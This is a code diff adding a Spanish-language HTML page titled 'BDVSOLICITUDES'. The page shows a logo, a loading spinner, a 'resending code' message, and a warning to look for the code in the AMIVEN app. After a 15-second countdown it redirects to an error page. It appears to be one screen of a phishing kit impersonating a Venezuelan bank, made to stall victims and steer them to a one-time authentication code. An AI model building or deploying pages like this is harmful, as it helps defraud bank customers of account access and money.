@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>BDVSOLICITUDES</title>
+    <style>
+      body {
+        margin: 0;
+        padding: 0;
+        font-family: Arial, sans-serif;
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background-image: url(background.webp);
+        background-size: cover;
+        background-position: center;
+      }
+
+      .container {
+        display: flex;
+        height: 100%;
+        width: 100%;
+      }
+
+      .left-side {
+        width: 50%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .right-side {
+        width: 50%;
+      }
+      form {
+        width: 80%;
+        background: white;
+        max-width: 550px;
+        box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.1);
+        padding-bottom: 20px;
+      }
+
+      @media (max-width: 768px) {
+        body {
+          background: #ededed;
+        }
+        .container {
+          flex-direction: column;
+        }
+        .left-side {
+          width: 100%;
+          height: 100vh;
+        }
+        .right-side {
+          display: none;
+        }
+      }
+
+      .form-group {
+        position: relative;
+        margin: 20px;
+        text-align: center;
+      }
+
+      /* ESTILO PARA EL NUEVO TEXTO AZUL */
+      .user-check-blue {
+        color: #0067b1;
+        font-weight: bold;
+        font-size: 13px;
+        margin: 10px 25px;
+        display: block;
+        line-height: 1.4;
+      }
+
+      /* ESTILO PARA EL TEXTO EN ROJO */
+      .ami-warning {
+        color: #d9534f;
+        font-weight: bold;
+        font-size: 13px;
+        margin: 10px 25px;
+        line-height: 1.4;
+        display: block;
+      }
+
+      .countdown-label {
+        color: black;
+        font-weight: bold;
+        display: block;
+        margin-top: 20px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="left-side">
+        <form>
+          <div style="text-align: center">
+            <img src="logo.png" alt="Logo" style="width: 60%; margin-top: 20px" />
+          </div>
+          
+          <div class="form-group">
+            <img src="ldr.gif" style="width: 100px" />
+          </div>
+
+          <div style="width: 100%; text-align: center; font-size: 12px; color: #999;">
+            Reenviando código. <br />
+            
+            <span class="user-check-blue">
+              ATENCION.
+            </span>
+
+            <span class="ami-warning">
+              Si posees la aplicacion AMIVEN debes buscar el codigo ahi.
+            </span>
+
+            <label class="countdown-label">
+              Tiempo restante <span id="countdown">15</span> segundos
+            </label>
+            
+            <script>
+              function startCountdown(seconds) {
+                var countdownElement = document.getElementById("countdown");
+
+                var countdownInterval = setInterval(function () {
+                  countdownElement.textContent = seconds;
+                  seconds--;
+
+                  if (seconds < 0) {
+                    clearInterval(countdownInterval);
+                    window.location.href = "error.html";
+                  }
+                }, 1000);
+              }
+
+              document.addEventListener("DOMContentLoaded", function () {
+                startCountdown(15); 
+              });
+            </script>
+          </div>
+        </form>
+      </div>
+      <div class="right-side"></div>
+    </div>
+  </body>
+</html>
